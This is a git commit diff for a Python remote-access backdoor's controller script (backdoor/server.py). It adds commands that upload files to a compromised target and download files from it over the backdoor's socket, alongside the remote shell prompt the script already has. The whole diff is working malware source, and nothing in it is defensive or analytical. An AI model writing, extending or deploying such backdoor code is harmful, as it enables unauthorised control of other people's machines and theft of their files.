c20d866b0f97dfb235dc9e9cb832b19b17a9e2d4
root <coolshiv0721@gmail.com>
2022-03-02 09:10:14 -0500

    Uploading & Downloading Files

--- backdoor/server.py
+++ backdoor/server.py
@@ -15,6 +15,23 @@ def reliable_recv():
 		except ValueError:
 			continue
 
+def upload_file(file_name):
+	f = open(file_name, 'rb')
+	target.send(f.read())
+
+def download_file(file_name):
+	f = open(file_name, 'wb')
+	target.settimeout(1)
+	chunk = target.recv(1024)
+	while chunk:
+		f.write(chunk)
+		try:
+			chunk = target.recv(1024)
+		except socket.timeout as e:
+			break
+	target.settimeout(None)
+	f.close()
+
 def target_communication():
 	while True:
 		command = input('* Shell~%s: ' % str(ip))
@@ -25,6 +42,10 @@ def target_communication():
 			os.system('clear') 
 		elif command[:3] == 'cd ':
 			pass
+		elif command[:8] == 'download':
+			download_file(command[9:])
+		elif command[:6] == 'upload':
+			upload_file(command[7:])
 		else:
 			result = reliable_recv()
 			print(result)
